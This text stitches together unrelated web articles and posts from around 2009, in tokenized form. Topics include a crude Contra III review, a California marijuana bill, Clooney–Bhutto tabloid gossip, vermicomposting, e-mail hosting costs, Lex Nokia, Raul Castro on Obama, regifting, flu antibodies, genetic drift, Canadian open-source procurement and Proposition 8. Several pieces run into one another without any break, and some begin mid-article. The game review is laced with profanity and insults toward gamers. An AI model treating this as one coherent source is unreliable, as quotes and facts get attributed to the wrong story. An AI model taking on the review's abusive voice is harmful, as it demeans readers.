Instead , you 'll find 31 flavors of ass kicking with a side of good old fashioned beat - down .
Parabolic streams of fire are no match for cocky poses .
Turtle boss getting his shit ruined .
The alien face spider leg rectum boss !
Walk down a corridor which conveniently leads to none other than the alien heart itself .
Aliens destroyed with the tank die the exact same way as aliens destroyed by machine gun , laser , spread , homing , flame thrower and rocket .
I would n't have it any other way .
The premise is simple : aliens have invaded and they 're probably up to no good , so destroy every last one of them to be on the safe side .
There are n't any rendered CG sequences in between levels .
This simple premise alone is enough to guide the story ; gamers do n't have to be spoon - fed the plot in long , boring cut scenes .
It does n't take hours and hours of character development to get into the game and you do n't need to set aside a two hour block of your life to get to a save point .
In fact , there are n't any save points .
Save points are for pussies .
Your character in this game always has infinite ammunition , an attribute lacking in almost every game today .
Developers today try to make their games as realistic as possible and the end result is having to spend hours and hours trying to find shit in the game .
It 's boring .
Nobody wants to play " virtual scavenger hunt . "
If I wanted to find shit for hours , I 'd clean my room , and if I wanted realism , I would n't be playing video games .
It 's that simple .
The characters in this game do n't talk .
They do n't have cute names .
They do n't make smartass comments every time they run into something , and they do n't have 10,000 frames of animation .
It does n't try to be a movie and a game simultaneously , because that formula never works and people always end up skipping the rendered sequences once they 've seen them anyway .
What 's the point ?
You never spend more than a few seconds running anywhere in this game .
Wave after wave of aliens are always attacking making it impossible to become bored because the aliens are always changing .
Level three for example has you dodging flame thrower robots , flying lizard alien mosquitos , a two - legged robot wall climber , snipers , winged troops jumping from UFOs , wall cannons , two mid-sized robots ( which look suspiciously like Hideo Kojima 's Snatchers ) and one giant Snatcher .
All of this in one tiny level .
Why I decided to write this homage to Contra III is because the game is just plain fun .
I recently bought State of Emergency for PS2 and was sorely disappointed with how shallow the game play was .
After the novelty of shooting everyone wears off ( 30 seconds into the game ) , you realize that there just is n't much more to it .
You end up running around the same mall killing the same enemies over and over .
The camera is the worst , and you 're constantly having to find new weapons to hunt down some generic looking pedestrian .
zzzZZZZZzzzzZZzzzzzz .
While technically it 's quite an accomplishment to have over 200 autonomous characters on screen at one time , you have to wonder if that 's enough to make a game fun .
Well , RockStar answered that question for us : no .
It 's boring .
I 'd take Contra III any day over a game like State of Emergency because Contra III , while over 10 years old has game play that 's infinitely more in depth than State of Emergency 's mindless button mashing .
Sadly , 90 % of the kids playing video games these days are dipshits who are washed over by fancy graphics , which is why the two Playstation attempts at recreating the Contra franchise have failed .
3D Contra sucks , as does 3D Castlevania ( the piece of shit N64 version ) , and I 'm sure they 're going to screw up the new Metroid that 's going to come out .
Why do n't you whores leave the classics alone ?
657,906 morons think graphics are what make video games fun .

I 'm not a big follower of couture fashion , but that might just be because it has n't been targeted to me .
Yeah , that 's the reason .
But including Lego and video games might change that .

Lanvin , a French clothing designer , has a new series of ads out that are right up my alley , involving crazy Lego guns , Pac - Man and Space Invaders setups .
They get me excited until I realize the point of the ads is still to show off ludicrous , overpriced and downright - goofy clothes hung on a model with an eating disorder and a wacky makeup job .
Get rid of that part , leave the Legos and video game stuff and I 'm sold .

California lawmaker introduces pot legalization bill Jeremy Gantz
Published : Monday February 23 , 2009
Print This Email This If California Assemblyman Tom Ammiano has his way , the Golden State might become known as the Green State to pot smokers around the country .
During a press conference Monday morning in San Francisco , Ammiano introduced " The Marijuana Control , regulation and education act . "
The far - reaching bill would go well beyond decriminalization of marijuana to actually legalize the cultivation , sale , purchase and possession of the plant .
 With the state in the midst of an historic economic crisis , the move towards regulating and taxing marijuana is simply common sense , " Ammiano said .
" This legislation would generate much needed revenue for the state , restrict access to only those over 21 , end the environmental damage to our public lands from illicit crops , and improve public safety by redirecting law enforcement efforts to more serious crimes . "
Ammiano and a group of speakers during the press conference described the bill as " a simple matter of fiscal common sense , " according to the San Francisco Weekly .
The bill would remove " all penalties under California law for the cultivation , transportation , sale , purchase , possession , and use of marijuana , natural THC and paraphernalia by persons over the age of 21 " ; would " prohibit local and state law enforcement officials from enforcing federal marijuana laws " ; and would create a $ 50 state fee for each ounce of marijuana sold , beyond whatever pot will cost once it becomes legal , the newspaper reported .
" Marijuana arrests actually increased 18 percent in California in 2007 while all other arrests for controlled substances fell , " Steve Gutwillig , California 's director of Drug Policy Alliance , said during the press conference .
" This costs the state a billion dollars a year and taxpayers are footing the bill .
Meanwhile , black marketers are laughing all the way to the bank . "
Ammiano's bold legislation comes on the heels of a recent statement by three former Latin American presidents , who called for legalization of marijuana and described the U.S. " War on Drugs " as a failure .
Former Colombian President Cesar Gaviria said there was no meaningful debate over drugs policy in the United States , despite a broad consensus that current policies had failed .
Last year , Rep. Barney Frank ( D - MA ) introduced a bill on Capitol Hill to decriminalize marijuana , which he called the " Make Room for the Serious Criminals Bill " on HBO 's Real Time with Bill Maher .
More than 10 U.S. states have decriminalized the possession of small amounts of the plant ; Massachusetts did so last month .
Oregon was the first to do so , in 1973 .
Speaking Monday at the San Francisco press conference , a retired Orange County judge said " the most harmful thing about marijuana today is prison . "
Judge James P. Gray , who recently retired from his 25 - year post and has run for Congress as a Republican , said prohibition of pot " clog [s ] the court system . "
" The stronger we get on marijuana , the softer we get with regard to all other prosecutions because we have only so many resources , " Gray said .
" And we at this moment , have thousands of people in state prison right this minute who did nothing but smoke marijuana . "
According to recent polls , 41 percent of Americans support legalizing marijuana .
That 's a higher approval rating than that currently enjoyed by Rush Limbaugh , former President George W. Bush and Republican congressional leaders , according to PollingReport.com .

He is Hollywood 's most eligible bachelor .
She is an outspoken poet and journalist born into Pakistan 's greatest political dynasty .
What , then , could spark a bigger media circus than a " secret romance " between George Clooney and Benazir Bhutto's 26 - year - old niece , Fatima ?
Newspapers across the subcontinent were thrown into frenzied excitement yesterday when America 's most influential supermarket tabloid claimed that Clooney had embarked on a long - distance relationship with Ms Bhutto after meeting her at an international conference last year .
The National Enquirer alleged that the 47 - year - old actor and political activist was privately smitten by the " brainy foreign beauty , " who lives with her brother and step - mother in a prosperous suburb of Karachi .
Download the new Independent Premium app Sharing the full story , not just the headlines
" George has courted her by phone and email , and arranged to meet her abroad when their schedules allowed , " a friend of Clooney told the paper .
" Now he wants her to spend time with him in Hollywood .
He 's still out there with his usual assortment of eye - candy hanging from his arm .
But George insists those days could be coming to an end if Fatima wants to take their relationship to the next level . "
The report was taken with a pinch of salt in the US , where the Enquirer has a mixed reputation for accuracy .
" Fatima was educated at Columbia University [ in New York ] and knew of [ Clooney 's ] heart - throb rep , " said the Enquirer .
" But she did n't take his advances seriously because she thought their age difference would make a serious relationship impractical . "
Ms Bhutto , who often writes newspaper columns criticising Pakistan 's government , is reported to be contesting her late aunt 's former seat in the Larkana constituency in the next elections .
She is also a prominent intellectual who has published a book of poetry , The Whispers of the Desert , and a memoir of the 2005 Kashmir earthquake .
The journalistic background would certainly strike a chord with Clooney , whose father was a famous newspaper reporter .
He has always taken a keen interest in global affairs , although his roster of previous girlfriends is almost exclusively made up of cocktail waitresses , actresses and models .
The workshop covered the indoor composting method known as vermicomposting , in which worms are enlisted to speed up the decomposition of organic material , eating through scraps of it and excreting the “ castings ” that make up compost .
( There are also commercial composters like the NatureMill , shown in the article below . )
The “ condo ” where this should take place is a 16 1/2 - inch - wide , one - foot - tall bin with air holes in which shredded newspaper sits atop green trash like the ends of carrots .
Despite the enthusiasm of the audience , particularly the children , as containers of compost and worms were passed around , some of its members seemed to have misgivings .
“ Will the compost bin attract roaches ? ” one asked .
( Not if you do n’t let the covered bin get smelly , he was told . )
“ What happens when you go on vacation ? ” ( The bin can stay unattended for up to three weeks . )
A few were trying again after unhappy first experiences .
“ Everything got disgusting in there , ” said Rachel Franz , 25 , who tried composting in Ithaca , N.Y. , in 2006 , following instructions from friends .
“ The worms started dying , and it got really moldy , ” she said .
“ When I opened it , the worms were trying to escape . ”
If the worms want out , said Carey Pulverman , the workshop ’s instructor and the project manager at the Lower East Side Ecology Center , “ something is wrong . ”
Happy worms eat about half their body weight in a day , and the compost is ready for harvesting in about four and half months , Ms. Pulverman said .
But if the paper is too wet , she continued , seepage or smell ensues .
Certain food and organic matter is bad for indoor bins because it smells while decomposing ( meat and dairy ) , attracts mold ( bread ) or may introduce insects to the bin ( dry leaves ) .
None of this deterred Ms. Franz , the failed composter , who this time around planned to set up her bin under the kitchen sink of her father ’s three - bedroom apartment in Chelsea , where she lives part of the time .
Her father , she said , was resisting .

“ He thinks it ’s going to be a lot of work for him , ” said Ms. Franz , who studied environmental science and is currently looking for work .

What does it cost to host an e-mail account ?
It seems like a simple question , but a remarkable number of enterprises surveyed by Forrester had no idea of how to answer that question .
A new report by the research company has taken a look under the hood of both in - house and commercial e-mail services , and put some numbers on the per-user costs associated with a variety of options .
The surprise result was not so much that Google 's corporate services come out ahead , but rather how large a lead it has on every other option .
The title of the report , " Should Your e-mail Live In The Cloud ?
A Comparative Cost Analysis , " is actually somewhat misleading .
The cloud implies a diffuse network of servers that hold partially redundant copies of information .
Some of the services examined by the report do n't necessarily offer that sort of setup , although the report frequently refers to any off - site service as " the cloud . "
Semantics aside , Forrester surveyed over 50 IT workers at major enterprise companies to see how they handle e-mail , contacts , and calendaring services .
They also discussed options and costs with 21 vendors of these services , and created some rough estimates of how much each portion of the various services cost .
One of the things they discovered is that the business community is largely unaware of the costs of running an e-mail account .
Many of those surveyed gave guesses from $ 2 to $ 11 per user , although a detailed accounting showed that the costs were often several times that ( Forrester came up with $ 25.18 per month , compared with $ 8.47 for Gmail ) .
Part of the problem is that costs are often split among several cost centers , with software licenses part of a different department 's budget from the salaries of the people that support it .
In some cases , the e-mail system was running on older hardware that had initially been bought for a different purpose and had been depreciated .
Despite the confusion , a lot of companies realize that e-mail has become expensive for two simple reasons : spam and malware .
Nearly half of those surveyed were evaluating off - site solutions because e-mail costs had risen , while another 30 percent were performing the evaluation as part of an upgrade or service consolidation process .
Fully 85 percent of these companies were leaning towards moving some of the services off - site .
The biggest reason for doing this seemed to be so that someone else could deal with staying on top of spam and malware ; over half of those surveyed were planning on implementing a hybrid system where an external service filtered mail on its way into and / or out of the company 's internal servers .
Reasons cited include the challenges of staying on top of the threats and up - to - date with the software , as well as the resource - intensive nature of combating mal - mail .
Another 30 percent were leaning towards a complete outsourcing of the service , presumably in part because of these costs .
The author of the report calculated the monthly costs for the components of various systems , such as storage and client software .
The biggest cost was clearly archiving , which is often legally required for a lot of positions .
Beyond that , the software and filtering costs all came in at roughly 10 to 15 percent of the costs when they 're needed — off - site services , for example , eliminate separate purchases of server and filtering software , and lower staff costs in exchange for a monthly subscription .
The overall conclusion is that any company with an employee count of under 15,000 would probably benefit from using off - site services .
The two examples of actual cloud services , Microsoft 's Exchange Online and Google Apps for Business , came out significantly ahead .
Exchange Online provided significantly lower costs until somewhere above 30,000 seats , while Google Apps ' monthly cost consistently came in at half the cost of others , in part because its subscription cost is so low , and in part because the " client software " is a free web browser .
The author of the report cautions that there are a lot of variables to consider , such as how often the company adds and removes users , the frequency of large attachments , and the archiving requirements .
Still , the results make it clear that Microsoft is now undercutting most of other services available , including those that rely on Exchange itself .
But Google has managed to significantly undercut Microsoft .
Although its solution is nowhere near as integrated as Exchange , an increasing percentage of the workforce is getting comfortable with managing their life and e-mail through a web browser .
By the end of this year , Sony plans to release the first Blu-ray Disc that will include a full PS3 videogame and a movie on a single disc .
Per Video Business ,
Sony is aggressively looking to utilize the added storage capacity a Blu-ray Disc has over an Xbox 360 Disc or Wii Disc .
With Blu-ray able to hold 50GB , an Xbox 360 disc pales in comparison at 9GB and Wii substantially less than that .
We ’ve seen an early version of this idea already when Midway released a collector ’s edition of John Woo ’s Strangehold for PS3 .
That set included Hard Boiled on a separate Blu-ray Disc .
To date , purchasing Strangehold is the only way to get Hard Boiled in 1080 p on Blu-ray .
A perfect opportunity to test this single - disc initiative would have been on Sony ’s own Ghostbusters .
The game is being published by Atari and film by Sony for a simultaneous release on June 16 .
Since we already know these two titles will be released separately , these new game / movie hybrid discs are n’t likely to appear until year ’s end .
“ We are actively pushing , and the way that we see the future is that the movie and the game are placed on the same disc , ” said John Koller , director of hardware marketing for the PS3 .
“ There are a lot of developers who say , we have this game based on a movie , would n’t it be great to marry these concepts ?
We will definitely see this stuff this year . ”

" Why are you flying our flag like that ?
It 's disgraceful ! " says a man as he leaves the Rally for Canada event at Queen 's Park in Toronto , to which the flag bearer responds " If you knew anything about politics , you 'd know what it means ! "
Heated confrontations with pro-coalition protesters were coupled with fighting amongst anti-coalition protesters - at least when rally attendees crossed paths with a fellow protestor flying an inverted Canada flag .
I have n't seen a Canadian flag displayed upside - down since the accident in 1992 .
It made me wonder what the official rules are .
If Canada were a ship at high seas and it struck an iceberg , was taking on water , with radio communications out , and no flares left to signal for help ... then flying the flag upside - down would be appropriate - it's an internationally recognized symbol for distress at sea ( do n't ask what happens if it 's a Japanese or Swiss boat ) .
Is flying the flag upside - down this the protestor 's way of likening our Canada , currently in parliamentary crisis , to a sinking ship ?
If so , I think it 's a little premature to be calling for outside help .
Officially in the US , their Flag Code explicitly states : " The flag should never be displayed with union down , except as a signal of dire distress in instances of extreme danger to life or property . "
Here in Canada , our Rules for Flag Flying state rather specifically the correct ways to display our flag ( none of which allow for the maple leaf to be inverted ) , but do n't go as far as saying that flying it upside - down is illegal , or disrespectful .
Nor does it states that it 's acceptable when aboard a boat in distress .
Apparently this has n't stopped others in Toronto from making waves by flying our National flag upside - down as a form of protest .
Let 's hope this does n't gain steam and become widely accepted .
Finnish - based cell phone giant Nokia appears to have issued something of an ultimatum to the Finnish government — at least according to one of the country 's newspapers , the Helsingin Sanomat .
The news has been rejected as false by both Nokia and the Finnish Prime Minister .
Company spokesperson Arja Suominen stated that " Nokia has in no way threatened to move , " dismissing the newspaper 's claim as " polemic ... it contains many mistakes and misunderstandings . "
Prime Minister Matti Vanhanen ( I lufe - a Scundeenefiun nemes ) also rejected the idea that Nokia had made such threats .
As he told Finnish broadcast company Yle , " I have not heard about such an ultimatum .
I have discussed ( the law ) with many companies including Nokia , and I have never heard that they have made such a threat . "
The paper claims to have spoken to an unnamed civil servant , who stated : " Nokia lobbied very hard for the proposed law to be unanimously approved ... ( The message ) was very clear : if the law was not approved , Nokia would leave Finland . "
Let 's cut through the " she said / it said / the Swedish Chef said " and examine what we know .
Nokia has been accused of illegally monitoring the email accounts of company employees on two separate occasions , first in 2001 , and again in 2005 .
The Helsingin Sanomat 's report does not make it clear whether or not any sort of official investigation was ever launched into Nokia 's activities or if the company was found to be in violation of Finnish privacy statutes in a court of law .
According to the paper 's account , however , Nokia had no legal right to monitor the e-mail of specific employees , even if it did have reason to believe corporate secrets were being passed to its competitors , as was the case in both instances .
Fast - forward to late last year , and we also know that Nokia has been an ardent proponent of a law that 's being referred to as " Lex Nokia . "
If passed , the " would would allow employers to investigate the log data of employees ’ e-mails , if the company has reason to suspect that corporate secrets are leaking out of the company or that the employer ’s communication networks are being misused . "
Supposedly , the employers would only be allowed to examine the sender , recipient , size of the message , volume of traffic , and " other matters related to email usage , " but let 's be honest here — if you 're a company already examining such information and you are n't supposed to be , once you 've actually got legal permission to do what you 've been doing illicitly , is that going to be good enough ?
Probably not .
No , now that you can legally do what you used to do illegally , it seems likely that you might take another step beyond , and accidentally hit " Enter . "
The EU 's policies on consumer data and privacy protection are generally held in high regard , but Nokia 's dogged support for the Lex Nokia " snooping law " is a sign that companies within the EU may be chafing under restraints they are n't required to uphold elsewhere .
Whether or not Nokia has actually voiced a real threat ( or would make good on it ) is n't something you get company confirmation on until the company has decided to actually make a move .
Regardless , it 's interesting to see such a scenario playing out from a United States ' perspective .

The Military Times conducted a survey two weeks ago where ten percent of soldiers claimed they wo n't re-enlist if the ban on openly gay personnel is lifted .
Joe tells everyone to calm down :
Even if the Military Times survey were to prove accurate ( which I seriously doubt ) , the latest Department of Defense numbers from November indicate that all military branches are presently meeting or exceeding their recruitment and retention goals .
With the economy the way it is , expect those numbers to balloon .
But this side - issue is burying the lede .
We have a clear - cut commitment from the president - elect that gay servicemembers will no longer have to serve in fear of being outed , hounded , fired or persecuted .
This is a huge step forward - because it is not about policing private individuals for prejudice , but about the government itself not discriminating irrationally against its own citizens .
I 've long wondered where the government gets off telling other people not to discriminate in employment when it does the same thing itself .
We want to hear what you think about this article .

HAVANA ( Reuters ) - U.S. President - elect Barack Obama appears to be an honest and sincere man , but his election has awakened “ excessive hopes ” that the United States will change , Cuban President Raul Castro said in a television interview broadcast on Friday .
Castro repeated previous assertions that he is open to talks at any time with Obama , who takes office on January 20 , but said he is not desperate to do so .
Obama has said he wants to ease the 46 - year - old U.S. trade embargo against Cuba and meet with Cuban leaders as first steps toward normalizing relations with the Communist - run island 90 miles off U.S. shores .
“ Now there is a president who has raised hopes in many parts of the world -- I think excessive hopes , ” Castro said in an interview on state - run television .
“ Because even if he ’s an honest man -- and I believe he is -- a sincere man -- and I believe he is -- one man alone cannot change the destiny of a country and much less the United States , ” said Castro , who replaced his ailing older brother Fidel Castro as president in February .
“ I hope I ’m mistaken in my assessment .
I hope Mr. Obama has success , ” he said .
“ He can do much , he can take positive steps , he can put forth more just ideas , he can put a stop to the tendency of almost all U.S. presidents to have their war , or wars , ” he said .

The interview was taped on December 31 , a day before Castro led celebrations of the 50th anniversary of the revolution that put his brother in power and turned Cuba to Communism at the height of the Cold War .
In a speech on Thursday , he spoke in harsh terms about U.S. treatment of Cuba and said the island can expect 50 years more of “ incessant struggle ” with an “ enemy ” that “ will never cease to be aggressive , treacherous and dominant . ”
In the interview , he said Cuba would talk with the United States whenever the U.S. wants , but only as equals , “ without the smallest shadow over our sovereignty . ”
“ We ’re willing to do it when they say , without intermediaries , directly , but we ’re in no hurry , we ’re not desperate , ” Castro said .
Regifting is a beautiful thing .
Wait .
Check that .
Thoughtful regifting is a beautiful thing .
Smart regifting is a wonderful thing .
Haphazard regifting is a bad thing , and a potentially dangerous one at that .
Regifting is a great way to show someone you ’re thinking of them without spending any money .
But that ’s only if you do it right .
And how do you regift the right way ?
By following the seven simple rules of regifting .
Never used .
Just because you ’ve hardly used that blender and you ’ve still got the box lying around does n’t mean it ’s okay to tape the whole thing up and stick it under the Christmas tree .
Partially used gift cards are n’t a great idea either .
Gifts should be unused , in their original packaging .
Light on sentimental value .
Did someone knit you that hat ?
Then that ’s your hat – do n’t try to give it away .
Particularly sentimental gifts are n’t very good candidates for regifting .
If you really do n’t want it , consider giving it to charity instead .
Nothing personalized .
A book you do n’t want could make a good present for someone else , but if the original giver inscribed some thoughtful words on the inside cover it becomes a slightly less good present for someone else .
Basically , if your name ’s on it anywhere , do n’t regift it .
Have a reason .
The most important rule of regifting is the central rule of all gifting – have a reason for giving what you give .
Giving any gift just for the sake of giving it undermines the joy of giving .
Only regift something that you believe the receiver would value and enjoy .
Consider the original giver .
In general , people give you gifts because they think you ’ll like them .
There ’s a universal understanding , however , that sometimes gift - giving misses the mark .
So it ’s not entirely surprising or shocking that sometimes you ’ll give a gift that the receiver then turns around and gives to someone else .
It happens .
Still , it ’s good form to make sure the regifted gift does n’t end up some place where the original giver will see it – or worse , accidentally given back to the original giver as a regift .
Presentation matters .
Regifting means saving on the cost of a new purchase , but it does n’t mean you can skip the time it takes to make it look nice .
No shame .
You do n’t need to announce to anyone that you ’re regifting ( in fact , do n’t ) , but at the same time do n’t feel weird about it either .
If you ’ve followed all the other rules you ’ve given someone something they ’ll cherish more than you would have .
And that ’s a great thing !
The most important thing to remember is the spirit of why you ’re doing what you ’re doing .
As long as there ’s meaning , thought , and good intention to your giving you really ca n’t go wrong .
If you 're looking for more regifting inspiration ( regifspiration ? ) , then check out some of our favorite regifting stories :
One team leader , Dr. Wayne A. Marasco of Harvard , said it began by screening a library of 27 billion antibodies he had created , looking for ones that take aim at the hemagglutinin “ spikes ” on the shells of flu viruses .
Antibodies are proteins normally produced by white blood cells that attach to invaders , either neutralizing them by clumping on or tagging them so that white cells can find and engulf them .
They can be built in the laboratory and then “ farmed ” in plants , driving prices down , Dr. Marasco said .
The flu virus uses the lollipop - shaped hemagglutinin spike to invade nose and lung cells .
There are 16 known types of spikes , H1 through H16 .
The spike ’s tip mutates constantly , which is why flu shots have to be reformulated each year .
But the team found a way to expose the spike ’s neck , which apparently does not mutate , and picked antibodies that clamped onto it .
Once its neck is clamped , a spike can still penetrate a human cell , but it cannot unfold to inject the genetic instructions that take over the cell ’s machinery to make more virus .
The team then turned the antibodies into full - length immunoglobulins and tested them in mice .
Immunoglobulin  antibodies derived from the blood of survivors of an infection  has a long history in medicine .
As early as the 1890s , doctors injected blood from sheep that had survived diphtheria to save a girl dying of it .
But there can be dangerous side effects , including severe immune reactions or accidental infection with other viruses .
The mice in the antibody experiments were injected before and after receiving doses of H5N1 .
In 80 percent of cases , they were protected .
The team then showed that their new antibodies could protect against both H1 and H5 viruses .
Most of the flu this season is H1 , and experts still fear that the lethal H5N1 bird flu may start a human pandemic .
However , the other seasonal flu outbreaks each year are usually caused by H3 or B strains , so flu shots must also contain those .
But there is always at least a partial mismatch because vaccine makers must pick from among strains circulating in February since it takes months to make supplies .
By the time the flu returns in November , its “ lollipop heads ” have often mutated .
Coming up on Darwin 's birthday , a lot is written about natural selection by non-biologists because opponents of evolution prefer to believe that biology stopped in 1859 .
Criticizing Darwin and Natural Selection is a lot easier if you ignore the 20th and 21st centuries .
And that 's okay , if the goal is a culture war rather than a science discussion , because even in Darwin 's time it was n't all balloons and ponies for Natural Selection .
It was years later that evolutionary biology got help from an understanding of genetics and Natural Selection became accepted after rigorous scientific investigation .
But if the discussion is a science one ( and it is , else you would n't be here ) you recognize that Evolution is a process , not a roadmap , and Natural Selection is just one mechanism in the process .
Because it 's just one process , things can happen even if they are not beneficial and , because Ma Nature sometimes has a sense of humor , things can even go to a weird place on occasion .
I 'm talking about genetic drift , evolution 's random walk , and it happens because each of us has two copies of each gene which can be the same ... or different .
When we have a child , the little critter gets one member of each pair we have but which one from each parent is completely random .
If you 're the gambling type , it means nature is basically flipping a coin .
Sure , if you have 100 children the distribution will be about even but we do n't get to have 100 children these days - believe me , I asked and got a firm scientific answer of " impossible " from my wife - and the more common instance of a couple only having one child means there is an absolute certainty one form of each gene ( allele ) from each parent will be lost .
Now do that for every child bearing couple and you can see where genetic drift gets interesting .
If you 're not the gambling type and need a different description , genetic drift is evolution 's equivalent of a sampling error .
Somewhere between 1 child and infinite children in a population is a perfect example of how evolution can happen without benefiting from natural selection 's input at all .
Take that , Sir Charles !
The fine folks at University of California Berkeley did this excellent graph showing genetic drift using marbles .
Why does it matter ?
Because genetic drift can cause changes that have no use at all but that become permanent in a population .
The smaller the population , the more impact genetic drift can have .
Back to coin flips .
Say you want an inherited gene to basically be ' tails ' on the coin .
If you flip heads 11 times there is only a 1 in 4096 chance it will be heads again - so tails is a good bet but heads can still happen because you still you have the same coin with two sides .
But genetic drift , the random walk of nature , means you could eliminate tails completely much sooner .
If the parents have one child and each parent has a heads and tails form of a gene , there is an equal chance the tails allele could be gone right away .
You can imagine that in a small population genetic drift could overrun natural selection but how do we prove it ?
Well , that 's the debate and part of the terrific nature of science .
The different shape of leaves that seem to serve no distinct purpose could be genetic drift but it could also be some form of natural selection that is imperceptible to us today .
The hard part is deciding what is truly genetic drift .
We do n't really know if something in evolution has no purpose ; we have a lot left to learn , including the purpose of plenty of things .
There may also be genetic drift in left over genes that serve no function today so it is unknown to us .
What will really be interesting is a future where we can actually determine the ' combat ' between natural selection , which essentially wants to improve fitness , and genetic drift , which does n't give a darn about anything except how the dice land .
There are plenty of other mechanisms in evolution ; too many for one article , but genetic drift is my favorite ; a little randomness is what keeps the world interesting .
Can't get enough biology ?

Despite the presence of military ships from several countries outside the coats of Somalia , Somalia - based sea piracy remains a problem .
The most obvious effect of this is increasing shipping costs as insurance premiums rises and as ships going from Asia to Europe avoid the Gulf of Aden and instead travels the Cape of Good Hope at the southern tip of Africa .
It will now also raise the price of tuna as fishing fleets increasingly stay away from the tuna rich waters outside Somalia , something which has resulted in reduced catches and therefore higher prices .
The answers are the actual responses by the tourism website officials , who obviously have an excellent sense of humour …

The government of Canada has issued an official Request For Information ( RFI ) on open source software and is looking for feedback and public guidance to help shape procurement policies .
This move could be a prelude to broader adoption of free and open source software in the Canadian government 's IT infrastructure .
Although Canada has weathered the global financial crisis better than many other countries , its government is looking for ways to compensate for a recent glut of stimulus spending that has generated the country 's first budget deficit in over a decade .
To help keep the economic recovery plan on track , Canada 's government is looking for ways to spend smarter .
The language used in the RFI makes it pretty clear that cost reduction is priority number one .
It uses the broad term " NO CHARGE LICENSED SOFTWARE " , which it defines as software that is open source or available at no cost .
According to the RFI , Canada is exploring no -cost software options on the desktop as well as the server , in categories that include operating systems , office suites , and automation systems .
A brief questionnaire is included to help direct responses .
It covers a number of common concerns and considerations that often play into open source adoption decisions .
Respondents are asked to comment on the potential for hidden costs , how to evaluate and manage compliance with open source licenses , and how open standards and interoperability should factor into the decision - making process .
The RFI also includes a list of the standard criteria — such as performance , quality control , testing , and training — that the government considers today when evaluating commercial software .
Checkboxes are placed next to each one so that respondents can indicate which are also applicable to open source software .
Open source software is no stranger to the north .
Canada 's Internet - savvy - but - largely - ignored Green party , which accounted for roughly 6.8 percent of the popular vote in the 2008 federal election , has long been a vocal advocate of open source software .
The party 's official platform declares that it will encourage broad adoption of open source software in government IT and mandate that all new software developed by the government is based on open standards .
Open source procurement has also been a topic of controversy in some parts of the country .
A nonprofit group called FACIL sued the province of Quebec last year , alleging that the provincial government failed to comply with procurement regulations by granting millions of dollars of no -bid contracts to Microsoft .
FACIL contends that adopting open source software would save money , create new jobs , and reduce Canada 's dependence on US companies .
The Canadian Association of Open Source says that the most significant impediment that is holding back Canada 's adoption of open source is a lack of awareness and understanding .
The RFI demonstrates that the government is eager to remedy that problem .
The information that is accumulated from the RFI responses could provide valuable insight that will help the government craft more effective procurement policies .
Although open source options are n't always as mature or powerful as proprietary alternatives in some areas , it 's improving all the time and deserves close consideration .
Articulating a strong interest in open source adoption might also give the government more negotiating leverage to secure some nice discounts from Microsoft .

The motorcycle design geniuses at Amen have constructed what is quite possibly the coolest looking ride I have ever seen .
Called the Hubless Monster , it is essentially that – a monster chopper with incredible hubless rims that a child could literally crawl through .
The hubless wheels seem to function beautifully ( video below ) and work by fixing a rotating tire , internal brake ring and bearings to the outer side of a fixed hubless rim , which in turn is secured to the forks ( front ) and swingarm ( rear ) .
The wheels are otherwise known as Orbital Wheels , originally designed by Dominique Mottas as an improvement on the earlier invention by Franco Sbarro .
Advantages to the orbital wheel design include less weight , more accurate steering and better braking , due to the brake being considerably closer to the rim .
The Hubless Monster project began back in 2004 and upon completion achieved a number of firsts .
The team claim that this mean ride is the first fully double hubless motorcycle , the first custom bike to have the world ’s largest motorcycle tire , as well as the first custom bike to be built without the tires being in existence – the team had to develop the monster 360 mm x 18 mm ( 14.17 ″ x 0.70 ″ ) rear tire especially for the bike .
The wheels on this ride make me think of the Honeycomb Tire , with its hollow hexagons that allow bullets to pass through .
The monster rear tire on the other hand … Gunbus anyone ?

( CNN ) -- Sponsors of the California ballot measure that banned same - sex marriage are seeking to nullify thousands of marriages between gay and lesbian couples performed after the state Supreme Court ruled them constitutional .
The passge of Proposition 8 left the future of thousands of marriages between same - sex couples unclear .
The sponsors Friday filed responses to three anti-Proposition 8 lawsuits with the state Supreme Court .
The briefs also defend Proposition 8 against opponents ' legal challenges , including an argument that the amendment needed a constitutional convention to be added to the state 's constitution .
" We are confident that the will of the voters and Proposition 8 will ultimately be upheld , " said Andrew Pugno , General Counsel for ProtectMarriage.com and the Proposition 8 Legal Defense Fund .
California Attorney General Edmund " Jerry " Brown called on the court to reject the initiative .
" Proposition 8 must be invalidated because the amendment process cannot be used to extinguish fundamental constitutional rights without compelling justification , " Brown said in a written statement .
Rick Jacobs , founder and chair of the anti-Proposition 8 Courage Campaign , said he was " appalled " that the initiative 's supporters wanted to nullify the same - sex marriages that are already on the books .
" The motivation behind this mean - spirited and heart - breaking action should not be allowed to be buried in legal brief , " he said .
" If Proposition 8 's sponsors plan to destroy lives , they should at least have the courage to admit it publicly . "
Opponents filed suit quickly after the November 4 election in which Proposition 8 passed 52 percent to 48 percent , effectively reversing a California Supreme Court decision that it was unconstitutional to deny marriage licenses to same - sex couples .
The vote also prompted a series of protests , some aimed at supporters of the proposition .
The proposition , which added an amendment to the state constitution , defined marriage as between one man and one woman .
Opponents argue that the amendment cannot be applied retroactively , but proponents say the amendment is clear on that issue .
" Proposition 8 's brevity is matched by its clarity , " one of the briefs read .
" There are no conditional clauses , exceptions , exemptions , or exclusions : ' Only marriage between a man and a woman is valid or recognized in California . '
" ...
Its plain language encompasses both pre-existing and later - created same - sex ( and polygamous ) marriages , whether performed in California or elsewhere .
With crystal clarity , it declares that they are not valid or recognized in California . "
Opponents are also seeking to have the amendment nullified , arguing that it alters the state 's constitution -- meaning the state Supreme Court 's May ruling -- and therefore , according to state law , is a revision that requires a constitutional convention .
Proponents of the amendment disagree .
" Petitioners ' challenge depends on characterizing Proposition 8 as a radical departure from the fundamental principles of the California Constitution , " their briefs said . " ...
But that portrayal is wildly wrong .
Proposition 8 is limited in nature and effect .
It does nothing more than restore the definition of marriage to what it was and always had been under California law before June 16 , 2008 -- and to what the people had repeatedly willed that it be throughout California 's history . "
California voters passed a ballot initiative in 2000 that changed the state 's Family Code to formally define marriage in the state between a man and a woman .
After San Francisco Mayor Gavin Newsom performed same - sex marriages in 2004 , which were promptly annulled , Newsom and others sought to have the ballot initiative struck down .
The California Supreme Court did so in May , and same - sex marriages were performed legally in California a month later .
The court 's ruling said the right to marry is among a set of basic human rights " so integral to an individual 's liberty and personal autonomy that they may not be eliminated or abrogated by the legislature or by the electorate through the statutory initiative process . "
But opponents had already been at work on Proposition 8 , seeking to enshrine the marriage definition in the constitution , and the initiative was approved for the November 4 vote .
Proposition 8 supporters also announced the addition of Kenneth Starr to their legal team .
